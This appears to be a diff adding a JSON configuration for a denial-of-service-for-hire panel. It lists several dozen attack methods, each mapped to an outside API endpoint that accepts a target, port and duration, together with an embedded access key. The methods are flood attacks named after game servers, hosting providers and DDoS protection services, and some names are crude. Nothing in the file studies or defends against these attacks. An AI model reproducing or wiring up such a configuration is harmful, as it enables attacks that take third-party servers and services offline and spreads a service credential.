@@ -1,0 +1,424 @@
+{ 
+
+    "methods" : [
+        
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=path-syn&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["path-syn"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=premium-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["premium-xv"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=arma3-zeus&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["arma3-zeus"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=greip-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["greip-xv"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=game-vip&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["game-vip"]
+
+                
+        },  
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=game-vip&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["equinox-ack"]
+
+                
+        },         
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=goldsyn-rail&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["goldsyn-rail"]
+
+                
+        },         
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ovh-cpuv2&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ovh-cpuv2"]
+
+                
+        },         
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=kgb-slav&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["kgb-slav"]
+
+                
+        },         
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=icmp-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["icmp-xv"]
+
+                
+        },                               
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=mc-teams&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["mc-teams"]
+                
+        },
+        {
+            "api_name" : "home-xv",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=home-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["home-xv"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ovh-special&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ovh-special"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=http-proxy&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["http-proxy"]
+
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=http-vip&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["http-vip"]
+
+                
+        },
+        { 
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=http-zeus&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["http-zeus"]
+
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=http-rate&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["http-rate"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=http-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["http-xv"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=tcp-bp&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["tcp-bp"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=100up-vip&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["100up-vip"]
+
+                
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ovh-vip&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ovh-vip"]
+
+    
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=nfo-zeus&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["nfo-zeus"]
+
+    
+        }, 
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ovh-all&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ovh-all"]
+
+    
+        },
+        {
+            "api_name" : "Hallow",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=r6-all&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["r6-all"]
+
+    
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=icmp-down&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["icmp-down"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=rl-crash&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["rl-crash"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=fivem-down&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["fivem-down"]
+
+                
+        },
+        { 
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ack-zeus&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ack-zeus"]
+
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=hyperfilter&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["hyperfilter"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=equinox-psh&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["equinox-psh"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=mixed-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["mixed-xv"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=vpn-zeus&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["vpn-zeus"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=rust-slap&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["rust-slap"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ovh-nuke&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ovh-nuke"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=tcp-rape&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["tcp-rape"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ddosguard&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ddosguard"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ark-lift&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ark-lift"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=coldwar-x&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["coldwar-x"]
+
+                
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=rail-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["rail-xv"]
+
+
+        },    
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=among-us&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["among-us"]
+
+
+        },    
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=https-zeus&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["https-zeus"]
+
+
+        },   
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=fivem-sock&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["fivem-sock"]
+
+
+        },     
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=path-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["path-xv"]
+
+
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=site-rape&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["site-rape"]
+
+
+        },         
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=ovh-rail&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["ovh-rail"]
+
+
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=tcprail-zs&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["tcprail-zs"]
+
+
+        },
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=hydra-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["hydra-xv"]
+
+        },     
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=udp-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["udp-xv"]
+
+
+        },     
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=syn-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["syn-xv"]
+
+
+        },     
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=galaxy-gate&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["galaxy-gate"]
+
+
+        },     
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=xsyn-amp&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["xsyn-amp"]
+
+
+        },               
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=2k-all&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["2k-all"]
+
+
+        },      
+        {
+            "api_name" : "STORM",
+            "target" : "http://apiaccess-kuramaservices.xyz/attack?method=nfo-xv&time=[duration]&target=[target]&port=[port]&key=OxBlood-KEY-11/3/2021-KFOEFOLL",
+            "urlEncode" : true,
+            "attack_methods" : ["nfo-xv"]
+
+        }
+    ] 
+}
